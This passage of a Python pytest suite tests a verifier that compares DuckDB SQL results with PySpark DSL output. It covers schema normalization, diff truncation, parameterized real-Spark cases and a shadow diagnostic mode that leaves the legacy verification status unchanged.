        assert report.total_diff_count >= 3, "3 行的 amount 值不同"

    def test_authoritative_schema_all_null_consistent(self, temp_parquet_dir):
        """Schema 不匹配+权威 schema+引擎双方值均为 NULL→补齐后 RESULT_CONSISTENT。"""
        config = NormalizationConfig(
            output_columns=[
                NormalizationColumn(column_name="order_id", data_type="varchar"),
                NormalizationColumn(column_name="extra_val", data_type="varchar"),
            ],
        )
        # 双方 extra_val 都是 NULL（DuckDB 无此列，Spark 也无此列）
        expected_rows = [
            {"order_id": "1"},
        ]
        mock_spark = _MockSparkExecutor(rows=expected_rows)
        verifier = PhysicalVerifier(
            spark_executor=mock_spark,
            normalization_config=config,
        )

        sql = 'SELECT "order_id" FROM "order_info" ORDER BY "order_id" LIMIT 1'
        pyspark = "result_df = input_df.select('order_id')"

        report = verifier.verify(
            sql_query=sql,
            pyspark_code=pyspark,
            snapshot_dir=temp_parquet_dir,
            contract_hash="hash_all_null",
            snapshot_id="snap_all_null",
            order_keys=["order_id"],
        )

        # 双方 extra_val 都补齐为"" → RESULT_CONSISTENT
        assert report.status == PhysicalVerificationStatus.RESULT_CONSISTENT, (
            f"预期 RESULT_CONSISTENT，实际 {report.status.value}。"
            f" 错误：{report.error_message}"
        )
        assert report.schema_match, "补齐后 schema 应匹配"

    # ── 差异截断与总数测试 ──

    def test_total_diff_count_reported(self):
        """>20 差异时 total_diff_count 返回真实总数。"""
        config = NormalizationConfig(
            output_columns=[NormalizationColumn(column_name="val", data_type="bigint")],
        )
        # 25 行各不相同
        duckdb_rows = [{"id": str(i), "val": str(i)} for i in range(25)]
        spark_rows = [{"id": str(i), "val": "999"} for i in range(25)]

        diffs, total_count, truncated = PhysicalVerifier._compute_diffs(
            duckdb_rows, spark_rows, config=config,
        )
        assert total_count == 25, f"总差异数应为 25，实际 {total_count}"
        assert len(diffs) == 20, f"详细差异应为 20，实际 {len(diffs)}"
        assert truncated, "应标记为截断"

    def test_diffs_not_truncated_when_under_20(self):
        """<20 差异时不应截断。"""
        config = NormalizationConfig(
            output_columns=[NormalizationColumn(column_name="val", data_type="bigint")],
        )
        duckdb_rows = [{"id": "1", "val": "1"}]
        spark_rows = [{"id": "1", "val": "999"}]

        diffs, total_count, truncated = PhysicalVerifier._compute_diffs(
            duckdb_rows, spark_rows, config=config,
        )
        assert total_count == 1
        assert len(diffs) == 1
        assert not truncated

    def test_row_count_mismatch_adds_to_total(self):
        """行数不匹配计入 total_diff_count。"""
        duckdb_rows = [{"id": "1", "val": "10"}] * 30  # 30 行
        spark_rows = [{"id": "2", "val": "20"}] * 10   # 10 行

        diffs, total_count, truncated = PhysicalVerifier._compute_diffs(
            duckdb_rows, spark_rows, config=None,
        )
        # 行数不匹配导致20行差异，但 single dedup 后实际也是有很多差异
        assert total_count >= 1
        assert len(diffs) >= 1
        if total_count > 20:
            assert truncated

    # ── 报告结构测试 ──

    def test_report_contains_new_fields(self):
        """PhysicalVerificationReport 包含 Phase 9B 新增字段。"""
        report = PhysicalVerificationReport(
            report_id="test_r",
            contract_hash="test_h",
            snapshot_id="test_s",
            status=PhysicalVerificationStatus.RESULT_CONSISTENT,
        )
        assert hasattr(report, "total_diff_count")
        assert hasattr(report, "diffs_truncated")
        assert hasattr(report, "normalization_config_snapshot")
        # 默认值
        assert report.total_diff_count == 0
        assert not report.diffs_truncated

    def test_report_contains_config_snapshot_when_configured(self, temp_parquet_dir):
        """配置了 NormalizationConfig 时，report 包含快照。"""
        config = NormalizationConfig(
            output_columns=[NormalizationColumn(column_name="order_id", data_type="varchar")],
            contract_hash="test_snap_hash",
        )
        expected_rows = [
            {"order_id": "1", "amount": 100, "region": "east"},
            {"order_id": "2", "amount": 200, "region": "west"},
            {"order_id": "3", "amount": 150, "region": "east"},
        ]
        mock_spark = _MockSparkExecutor(rows=expected_rows)
        verifier = PhysicalVerifier(
            spark_executor=mock_spark,
            normalization_config=config,
        )

        sql = 'SELECT * FROM "order_info" ORDER BY "order_id"'
        pyspark = "result_df = input_df.orderBy('order_id')"

        report = verifier.verify(
            sql_query=sql,
            pyspark_code=pyspark,
            snapshot_dir=temp_parquet_dir,
            contract_hash="test_snap_hash",
            snapshot_id="snap_config_test",
            order_keys=["order_id"],
        )

        assert report.normalization_config_snapshot, "应包含 config snapshot"
        assert "float_abs_tolerance" in report.normalization_config_snapshot
        assert report.normalization_config_snapshot["output_column_count"] == 1


# ════════════════════════════════════════════
# 真实 PySpark 执行集成测试（--run-slow）
# ════════════════════════════════════════════


# 9 种 Phase 6A+6B+6C step 类型的参数化用例
# 每项：(用例名, SQL, PySpark DSL, 排序键)
_REAL_SPARK_CASES: list[tuple[str, str, str, list[str]]] = [
    # ── 6A step 类型 ──
    (
        "scan",
        'SELECT * FROM "order_info" ORDER BY "order_id"',
        'result_df = input_df.orderBy("order_id")',
        ["order_id"],
    ),
    (
        "filter",
        'SELECT * FROM "order_info" WHERE "amount" > 100 ORDER BY "order_id"',
        'result_df = input_df.filter(F.col("amount") > 100).orderBy("order_id")',
        ["order_id"],
    ),
    (
        "project",
        'SELECT "order_id", "amount" FROM "order_info" ORDER BY "order_id"',
        'result_df = input_df.select("order_id", "amount").orderBy("order_id")',
        ["order_id"],
    ),
    (
        "sort",
        'SELECT * FROM "order_info" ORDER BY "order_id"',
        'result_df = input_df.orderBy("order_id")',
        ["order_id"],
    ),
    (
        "limit",
        'SELECT * FROM "order_info" ORDER BY "order_id" LIMIT 2',
        'result_df = input_df.orderBy("order_id").limit(2)',
        ["order_id"],
    ),
    # ── 6B step 类型 ──
    (
        "aggregate",
        'SELECT "region", COUNT(*) AS cnt, SUM("amount") AS total '
        'FROM "order_info" GROUP BY "region" ORDER BY "region"',
        'result_df = input_df.groupBy("region").agg('
        'F.count("*").alias("cnt"), F.sum("amount").alias("total")'
        ').orderBy("region")',
        ["region"],
    ),
    (
        "join",
        'SELECT a."order_id" AS order_id, a."amount" AS amount '
        'FROM "order_info" a JOIN "order_info" b ON a."order_id" = b."order_id" '
        'ORDER BY order_id',
        'result_df = input_df.alias("a").join('
        'input_df.alias("b"), '
        'F.col("a.order_id") == F.col("b.order_id")'
        ').select('
        'F.col("a.order_id").alias("order_id"), '
        'F.col("a.amount").alias("amount")'
        ').orderBy("order_id")',
        ["order_id"],
    ),
    (
        "case_when",
        'SELECT *, CASE WHEN "amount" > 150 THEN \'high\' ELSE \'low\' END AS category '
        'FROM "order_info" ORDER BY "order_id"',
        'result_df = input_df.withColumn('
        '"category", '
        'F.when(F.col("amount") > 150, "high").otherwise("low")'
        ').orderBy("order_id")',
        ["order_id"],
    ),
    # ── 6C step 类型：窗口函数 ──
    (
        "window_row_number",
        'SELECT *, ROW_NUMBER() OVER (ORDER BY "order_id") AS rn '
        'FROM "order_info" ORDER BY "order_id"',
        'from pyspark.sql.window import Window\n'
        'result_df = input_df.withColumn('
        '"rn", F.row_number().over(Window.orderBy("order_id"))'
        ').orderBy("order_id")',
        ["order_id"],
    ),
    (
        "window_sum_over",
        'SELECT *, SUM("amount") OVER (PARTITION BY "region" ORDER BY "order_id") '
        'AS running_total FROM "order_info" ORDER BY "order_id"',
        'from pyspark.sql.window import Window\n'
        'window_spec = Window.partitionBy("region").orderBy("order_id")\n'
        'result_df = input_df.withColumn('
        '"running_total", F.sum("amount").over(window_spec)'
        ').orderBy("order_id")',
        ["order_id"],
    ),
    (
        "window_rank",
        'SELECT *, RANK() OVER (ORDER BY "amount") AS rk '
        'FROM "order_info" ORDER BY "order_id"',
        'from pyspark.sql.window import Window\n'
        'result_df = input_df.withColumn('
        '"rk", F.rank().over(Window.orderBy("amount"))'
        ').orderBy("order_id")',
        ["order_id"],
    ),
]


class TestRealSparkExecution:
    """真实 PySpark 子进程验证——双引擎结果一致性（需 PySpark 环境）。

    每个用例：
    1. 在 DuckDB 中执行 SQL（基准引擎）
    2. 在真实 PySpark 子进程中执行 DSL（验证引擎）
    3. 断言 RESULT_CONSISTENT

    前置条件：
    - 标记 @pytest.mark.slow，需显式 `--run-slow`
    - 本机需安装 PySpark 及兼容 Java 版本
    - 不满足时 spark_available fixture 自动 skip 全部 11 个用例
    - 每次约 30s（SparkSession 启动开销）

    当前 11 个用例覆盖 6A（scan/filter/project/sort/limit）+ 6B（aggregate/join/case_when）
    + 6C（window_row_number/window_sum_over/window_rank）。
    """

    @pytest.fixture(scope="class")
    def spark_available(self):
        """检查真实 PySpark 环境是否可用——Java 版本不兼容时自动跳过。"""
        executor = LocalSparkExecutor()
        if not executor.check_environment():
            pytest.skip("PySpark 环境不可用（Java 版本不兼容或未安装 PySpark）")

    @pytest.mark.slow
    @pytest.mark.parametrize(
        "case_name,sql_query,pyspark_code,order_keys",
        _REAL_SPARK_CASES,
        ids=[c[0] for c in _REAL_SPARK_CASES],
    )
    def test_real_spark_consistency(
        self,
        temp_parquet_dir,
        spark_available,
        case_name,
        sql_query,
        pyspark_code,
        order_keys,
    ):
        """真实 PySpark 与 DuckDB 结果应一致。"""
        spark_executor = LocalSparkExecutor()
        verifier = PhysicalVerifier(spark_executor=spark_executor)

        report = verifier.verify(
            sql_query=sql_query,
            pyspark_code=pyspark_code,
            snapshot_dir=temp_parquet_dir,
            contract_hash=f"test_real_{case_name}",
            snapshot_id=f"snap_real_{case_name}",
            order_keys=order_keys,
        )

        assert report.status == PhysicalVerificationStatus.RESULT_CONSISTENT, (
            f"[{case_name}] 预期 RESULT_CONSISTENT，实际 {report.status.value}。"
            f" 错误：{report.error_message}"
            f" DuckDB 行数：{report.duckdb_result.raw_row_count if report.duckdb_result else 'N/A'}"
            f" Spark 行数：{report.spark_result.raw_row_count if report.spark_result else 'N/A'}"
        )


# ════════════════════════════════════════════
# Task 4: inputs[别名] 全链路 E2E 回归
# ════════════════════════════════════════════


def test_spark_inputs_alias_resolves_end_to_end():
    """回归：快照物理名 + 索引别名 ft，PySpark inputs['ft'] 全链路解析，无 KeyError。"""
    import pytest
    pytest.importorskip("pyspark")
    import json
    import tempfile
    from pathlib import Path

    import pyarrow as pa
    import pyarrow.parquet as pq

    from tianshu_datadev.spark.executor import LocalSparkExecutor

    with tempfile.TemporaryDirectory(prefix="tianshu_e2e_alias_") as snapshot_dir:
        pq.write_table(
            pa.table({"amount": [10, 20]}),
            str(Path(snapshot_dir) / "fact_trips_sample.parquet"),
        )
        (Path(snapshot_dir) / "_inputs_index.json").write_text(
            json.dumps({"ft": "fact_trips_sample.parquet"}), encoding="utf-8"
        )

        # executor 要求定义 transform(inputs)，由内部输出收集器调用
        code = "def transform(inputs):\n    return inputs['ft']"
        result = LocalSparkExecutor().execute(code, data_dir=snapshot_dir)
        assert result.status.name == "SUCCESS", result.error_message


# ════════════════════════════════════════════
# CRE shadow 模式集成测试（要求 5）
# ════════════════════════════════════════════


class TestPhysicalVerifierShadow:
    """CRE shadow 集成测试——验证 shadow 报告的正确性和安全边界。

    所有场景断言 legacy status 完全不变（要求 5.7）。
    """

    # ── 基础数据 ──

    _SAMPLE_COLUMNS = [
        NormalizationColumn(column_name="id", data_type="bigint"),
        NormalizationColumn(column_name="val", data_type="double"),
    ]
    _SAMPLE_CONFIG = NormalizationConfig(
        output_columns=_SAMPLE_COLUMNS,
        primary_keys=["id"],
        contract_hash="shadow_test_hash",
    )

    @staticmethod
    def _make_shadow_report(
        duckdb_rows: list[dict] | None = None,
        spark_rows: list[dict] | None = None,
        config: NormalizationConfig | None = None,
        legacy_status: str = "RESULT_CONSISTENT",
        primary_keys: list[str] | None = None,
        timezone: str = "",
        environment_manifest: EnvironmentManifest | None = None,
    ) -> CreShadowReport:
        """辅助方法：调用 _shadow_cre_diagnose 并验证返回结构。"""
        if config is None:
            config = TestPhysicalVerifierShadow._SAMPLE_CONFIG
        report = PhysicalVerifier._shadow_cre_diagnose(
            duckdb_raw=duckdb_rows or [],
            spark_raw=spark_rows or [],
            norm_config=config,
            legacy_status=legacy_status,
            contract_hash="test_hash",
            snapshot_id="test_snap",
            primary_keys=primary_keys,
            timezone=timezone,
            environment_manifest=environment_manifest,
        )
        # 验证报告是 CreShadowReport 实例
        assert isinstance(report, CreShadowReport)
        assert report.cre_status
        assert report.mapped_status
        assert report.legacy_status
        return report

    # ── 1. 同结论映射一致 ──

    def test_shadow_same_conclusion_mapping(self):
        """CRE CONSISTENT + legacy RESULT_CONSISTENT → status_consistent=True。"""
        rows = [{"id": 1, "val": 10.5}, {"id": 2, "val": 20.3}]
        report = self._make_shadow_report(
            duckdb_rows=rows,
            spark_rows=rows,
            legacy_status="RESULT_CONSISTENT",
            primary_keys=["id"],
        )
        assert report.cre_status in ("CONSISTENT", "CONSISTENT_WITH_WARN"), (
            f"CRE 应判定一致，实际 {report.cre_status}"
        )
        assert report.mapped_status == "RESULT_CONSISTENT"
        assert report.status_consistent is True
        assert report.diagnostic_available is True

    # ── 2. 容差 WARN 映射一致 ──

    def test_shadow_warn_maps_to_consistent(self):
        """CONSISTENT_WITH_WARN → mapped RESULT_CONSISTENT，status_consistent=True。"""
        # 容差内尾差数据
        duckdb_rows = [{"id": 1, "val": 10.12345678901}]
        spark_rows = [{"id": 1, "val": 10.12345678902}]  # 微小差异在 float 容差内
        report = self._make_shadow_report(
            duckdb_rows=duckdb_rows,
            spark_rows=spark_rows,
            legacy_status="RESULT_CONSISTENT",
            primary_keys=["id"],
        )
        # CRE 可能判定为 CONSISTENT_WITH_WARN（容差内符合条件时）
        # 也可能 exact CONSISTENT（编码一致时）
        assert report.cre_status in ("CONSISTENT", "CONSISTENT_WITH_WARN"), (
            f"CRE 应判定为 CONSISTENT 类型，实际 {report.cre_status}"
        )
        assert report.mapped_status == "RESULT_CONSISTENT"
        assert report.status_consistent is True
        assert report.diagnostic_available is True

    # ── 3. 真实 MISMATCH ──

    def test_shadow_real_mismatch(self):
        """值显著不同 → CRE MISMATCH → mapped RESULT_MISMATCH。"""
        duckdb_rows = [{"id": 1, "val": 10.5}, {"id": 2, "val": 20.3}]
        spark_rows = [{"id": 1, "val": 999.9}, {"id": 2, "val": 20.3}]
        report = self._make_shadow_report(
            duckdb_rows=duckdb_rows,
            spark_rows=spark_rows,
            legacy_status="RESULT_MISMATCH",
            primary_keys=["id"],
        )
        assert report.cre_status == "MISMATCH", (
            f"CRE 应判定为 MISMATCH，实际 {report.cre_status}"
        )
        assert report.mapped_status == "RESULT_MISMATCH"
        assert report.status_consistent is True
        assert report.diagnostic_available is True

    # ── 4. 缺主键 → NOT_EXECUTED ──

    def test_shadow_missing_primary_keys_multi_row(self):
        """无主键+多行→NOT_EXECUTED——禁止按行号猜键。"""
        config_no_pk = NormalizationConfig(
            output_columns=TestPhysicalVerifierShadow._SAMPLE_COLUMNS,
            primary_keys=[],
        )
        report = self._make_shadow_report(
            duckdb_rows=[{"id": 1, "val": 10.5}, {"id": 2, "val": 20.3}],
            spark_rows=[{"id": 1, "val": 10.5}, {"id": 2, "val": 20.3}],
            config=config_no_pk,
            legacy_status="RESULT_CONSISTENT",
            primary_keys=None,
        )
        assert report.cre_status == "NOT_EXECUTED"
        assert report.mapped_status == "NOT_EXECUTED"
        assert report.diagnostic_available is False
        assert report.human_review_recommended is True
        assert "singleton" in report.error_message.lower()

    def test_shadow_singleton_no_pk_allowed(self):
        """无主键但双侧均恰好 1 行→允许 singleton 对齐。"""
        config_no_pk = NormalizationConfig(
            output_columns=TestPhysicalVerifierShadow._SAMPLE_COLUMNS,
            primary_keys=[],
        )
        report = self._make_shadow_report(
            duckdb_rows=[{"id": 1, "val": 10.5}],
            spark_rows=[{"id": 1, "val": 10.5}],
            config=config_no_pk,
            legacy_status="RESULT_CONSISTENT",
            primary_keys=None,
        )
        # Singleton 对齐成功 → CONSISTENT
        assert report.cre_status in ("CONSISTENT", "CONSISTENT_WITH_WARN"), (
            f"Singleton 应对齐成功，实际 {report.cre_status}"
        )
        assert report.diagnostic_available is True

    def test_shadow_singleton_no_pk_mismatch(self):
        """无主键 singleton 对齐但值不同→MISMATCH。"""
        config_no_pk = NormalizationConfig(
            output_columns=TestPhysicalVerifierShadow._SAMPLE_COLUMNS,
            primary_keys=[],
        )
        report = self._make_shadow_report(
            duckdb_rows=[{"id": 1, "val": 10.5}],
            spark_rows=[{"id": 1, "val": 999.9}],
            config=config_no_pk,
            legacy_status="RESULT_MISMATCH",
            primary_keys=None,
        )
        assert report.cre_status == "MISMATCH"
        assert report.diagnostic_available is True

    def test_shadow_no_pk_duckdb_multi_row(self):
        """DuckDB 多行、Spark 1 行→NOT_EXECUTED（不满足 singleton）。"""
        config_no_pk = NormalizationConfig(
            output_columns=TestPhysicalVerifierShadow._SAMPLE_COLUMNS,
            primary_keys=[],
        )
        report = self._make_shadow_report(
            duckdb_rows=[{"id": 1, "val": 10.5}, {"id": 2, "val": 20.3}],
            spark_rows=[{"id": 1, "val": 10.5}],
            config=config_no_pk,
            legacy_status="RESULT_CONSISTENT",
            primary_keys=None,
        )
        assert report.cre_status == "NOT_EXECUTED"
        assert report.diagnostic_available is False

    def test_shadow_empty_primary_keys_singleton(self):
        """主键为空列表+1行→singleton 对齐（等效无主键）。"""
        report = self._make_shadow_report(
            duckdb_rows=[{"id": 1, "val": 10.5}],
            spark_rows=[{"id": 1, "val": 10.5}],
            legacy_status="RESULT_CONSISTENT",
            primary_keys=[],
        )
        assert report.cre_status in ("CONSISTENT", "CONSISTENT_WITH_WARN")

    def test_shadow_config_no_primary_keys_multi_row(self):
        """norm_config.primary_keys 为空+多行→NOT_EXECUTED。"""
        config = NormalizationConfig(
            output_columns=TestPhysicalVerifierShadow._SAMPLE_COLUMNS,
            primary_keys=[],
        )
        report = self._make_shadow_report(
            duckdb_rows=[{"id": 1, "val": 10.5}, {"id": 2, "val": 20.3}],
            spark_rows=[{"id": 1, "val": 10.5}, {"id": 2, "val": 20.3}],
            config=config,
            legacy_status="RESULT_CONSISTENT",
            primary_keys=None,
        )
        assert report.cre_status == "NOT_EXECUTED"
        assert report.diagnostic_available is False

    # ── 5. 重复/NULL 主键 ──

    def test_shadow_duplicate_primary_keys(self):
        """重复主键 → HUMAN_REVIEW，诊断不可用。"""
        duckdb_rows = [
            {"id": 1, "val": 10.5},
            {"id": 1, "val": 20.3},  # 重复 id=1
        ]
        spark_rows = [
            {"id": 1, "val": 10.5},
            {"id": 1, "val": 20.3},
        ]
        report = self._make_shadow_report(
            duckdb_rows=duckdb_rows,
            spark_rows=spark_rows,
            legacy_status="RESULT_CONSISTENT",
            primary_keys=["id"],
        )
        assert report.cre_status in ("HUMAN_REVIEW", "MISMATCH"), (
            f"重复主键应无法自动对齐，实际 {report['cre_status']}"
        )
        # duplicate_keys → HUMAN_REVIEW 或 MISMATCH，但不会 CONSISTENT
        assert report.cre_status not in ("CONSISTENT", "CONSISTENT_WITH_WARN")

    def test_shadow_null_primary_keys(self):
        """NULL 主键 → HUMAN_REVIEW，诊断不可用。"""
        report = self._make_shadow_report(
            duckdb_rows=[{"id": None, "val": 10.5}],
            spark_rows=[{"id": None, "val": 10.5}],
            legacy_status="RESULT_CONSISTENT",
            primary_keys=["id"],
        )
        # NULL PK → 对齐失败 → HUMAN_REVIEW 或 error_message 含 NULL
        assert report.cre_status in ("HUMAN_REVIEW", "MISMATCH")
        assert report.cre_status not in ("CONSISTENT", "CONSISTENT_WITH_WARN", "NOT_EXECUTED")

    # ── 6. shadow 异常处理 ──

    def test_shadow_exception_handling(self):
        """异常 → diagnostic_available=False, human_review_recommended=True。"""
        # 直接调用 _shadow_cre_diagnose 并传入 None config
        report = PhysicalVerifier._shadow_cre_diagnose(
            duckdb_raw=[{"id": 1, "val": 10.5}],
            spark_raw=[{"id": 1, "val": 10.5}],
            norm_config=None,
            legacy_status="RESULT_CONSISTENT",
            primary_keys=["id"],
        )
        assert report.cre_status == "NOT_EXECUTED"
        assert report.diagnostic_available is False
        assert report.human_review_recommended is True

    def test_shadow_exception_bad_timezone(self):
        """非法 timezone → CRE 编码异常 → diagnostic_available=False。"""
        report = self._make_shadow_report(
            duckdb_rows=[{"id": 1, "val": 10.5}],
            spark_rows=[{"id": 1, "val": 10.5}],
            legacy_status="RESULT_CONSISTENT",
            primary_keys=["id"],
            timezone="INVALID_TIMEZONE",  # 无 timestamp 列但传入非法时区——不影响
        )
        # 没有 timestamp 列，非法 timezone 不影响
        assert report.diagnostic_available is True

    # ── 7. legacy status 完全不变 —— 通过 verify() 全流程验证 ──

    def test_shadow_legacy_status_unchanged_consistent(self, temp_parquet_dir):
        """CRE shadow 存在时 legacy status 仍为 RESULT_CONSISTENT。"""
        # order_info Parquet 有 3 行数据（order_id=1/2/3, amount=100/200/150）
        expected_rows = [
            {"order_id": "1", "amount": 100, "region": "east"},
            {"order_id": "2", "amount": 200, "region": "west"},
            {"order_id": "3", "amount": 150, "region": "east"},
        ]
        mock_spark = _MockSparkExecutor(rows=expected_rows)
        config = NormalizationConfig(
            output_columns=[
                NormalizationColumn(column_name="order_id", data_type="varchar"),
                NormalizationColumn(column_name="amount", data_type="double"),
                NormalizationColumn(column_name="region", data_type="varchar"),
            ],
            primary_keys=["order_id"],
        )
        verifier = PhysicalVerifier(
            spark_executor=mock_spark,
            normalization_config=config,
        )
        report = verifier.verify(
            sql_query='SELECT * FROM "order_info" ORDER BY "order_id"',
            pyspark_code='result_df = input_df.orderBy("order_id")',
            snapshot_dir=temp_parquet_dir,
            contract_hash="test_shadow_legacy",
            snapshot_id="snap_shadow_001",
            order_keys=["order_id"],
            cre_primary_keys=["order_id"],
        )
        # legacy status 不变
        assert report.status == PhysicalVerificationStatus.RESULT_CONSISTENT
        # CRE shadow 报告存在
        assert report.cre_shadow_report is not None
        assert report.cre_shadow_report.diagnostic_available is True

    def test_shadow_legacy_status_unchanged_no_cre_keys(self, temp_parquet_dir):
        """不传 CRE 主键 → shadow NOT_EXECUTED，legacy status 仍为 RESULT_CONSISTENT。"""
        # order_info Parquet 有 3 行数据
        expected_rows = [
            {"order_id": "1", "amount": 100, "region": "east"},
            {"order_id": "2", "amount": 200, "region": "west"},
            {"order_id": "3", "amount": 150, "region": "east"},
        ]
        mock_spark = _MockSparkExecutor(rows=expected_rows)
        config = NormalizationConfig(
            output_columns=[
                NormalizationColumn(column_name="order_id", data_type="varchar"),
                NormalizationColumn(column_name="amount", data_type="double"),
                NormalizationColumn(column_name="region", data_type="varchar"),
            ],
            primary_keys=["order_id"],
        )
        # 不传 cre_primary_keys → shadow NOT_EXECUTED，但不影响 legacy status
        verifier = PhysicalVerifier(
            spark_executor=mock_spark,
            normalization_config=config,
        )
        report = verifier.verify(
            sql_query='SELECT * FROM "order_info" ORDER BY "order_id"',
            pyspark_code='result_df = input_df.orderBy("order_id")',
            snapshot_dir=temp_parquet_dir,
            contract_hash="test_shadow_legacy_nopk",
            snapshot_id="snap_shadow_002",
            order_keys=["order_id"],
            # 不传 cre_primary_keys → CRE shadow NOT_EXECUTED
        )
        # legacy status 仍然是 RESULT_CONSISTENT（数据一致）
        assert report.status == PhysicalVerificationStatus.RESULT_CONSISTENT
        # CRE shadow 报告非 None（有 config.output_columns）
        assert report.cre_shadow_report is not None
        assert report.cre_shadow_report.legacy_status == "RESULT_CONSISTENT"

    def test_shadow_legacy_status_unchanged_execution_error(self, temp_parquet_dir):
        """Spark 执行失败时 CRE shadow 不影响 legacy EXECUTION_ERROR。"""
        mock_spark = _MockSparkExecutor(success=False)  # Spark 执行失败
        verifier = PhysicalVerifier(spark_executor=mock_spark)

        report = verifier.verify(
            sql_query='SELECT * FROM "order_info" ORDER BY "order_id"',
            pyspark_code='result_df = input_df.orderBy("order_id")',
            snapshot_dir=temp_parquet_dir,
            contract_hash="test_shadow_error",
            snapshot_id="snap_shadow_003",
            order_keys=["order_id"],
        )
        # Spark 失败 → EXECUTION_ERROR
        assert report.status == PhysicalVerificationStatus.EXECUTION_ERROR
        # CRE shadow 应为 None（执行失败时无数据）或 NOT_EXECUTED
        if report.cre_shadow_report is not None:
            assert report.cre_shadow_report.legacy_status == "EXECUTION_ERROR"

    # ── 8. EnvironmentManifest 传入 ──

    def test_shadow_with_environment_manifest(self):
        """EnvironmentManifest 显式传入后用于 NaN/Inf 判定。"""
        # 双引擎间 NaN 差异
        duckdb_rows = [{"id": 1, "val": float("nan")}]
        spark_rows = [{"id": 1, "val": float("nan")}]

        # 传入 EQUAL 策略 → NaN==NaN
        report = self._make_shadow_report(
            duckdb_rows=duckdb_rows,
            spark_rows=spark_rows,
            legacy_status="RESULT_CONSISTENT",
            primary_keys=["id"],
            environment_manifest=EnvironmentManifest(
                nan_handling=SpecialFloatStrategy.EQUAL,
                pos_inf_handling=SpecialFloatStrategy.MISMATCH,
                neg_inf_handling=SpecialFloatStrategy.HUMAN_REVIEW,
            ),
        )
        # EQUAL 策略下双 NaN → CONSISTENT（若编码完全一致）或 CONSISTENT_WITH_WARN
        assert report.diagnostic_available is True

    # ── 9. 缺 output_columns ──

    def test_shadow_missing_output_columns(self):
        """缺少 output_columns → NOT_EXECUTED + human_review_recommended。"""
        config = NormalizationConfig(output_columns=[])
        report = self._make_shadow_report(
            duckdb_rows=[{"id": 1, "val": 10.5}],
            spark_rows=[{"id": 1, "val": 10.5}],
            config=config,
            legacy_status="RESULT_CONSISTENT",
            primary_keys=["id"],
        )
        assert report.cre_status == "NOT_EXECUTED"
        assert report.diagnostic_available is False
        assert report.human_review_recommended is True
        assert "缺少 Contract output_columns" in report.error_message

    # ── 10. 不同结论 → human_review_recommended ──

    def test_shadow_different_conclusion(self):
        """CRE 与 legacy 结论不同 → human_review_recommended=True。"""
        rows = [{"id": 1, "val": 10.5}]
        report = self._make_shadow_report(
            duckdb_rows=rows,
            spark_rows=rows,
            legacy_status="RESULT_MISMATCH",  # legacy 说 MISMATCH
            primary_keys=["id"],
        )
        # CRE 说 CONSISTENT，legacy 说 MISMATCH
        assert report.mapped_status == "RESULT_CONSISTENT"
        assert report.status_consistent is False
        assert report.human_review_recommended is True
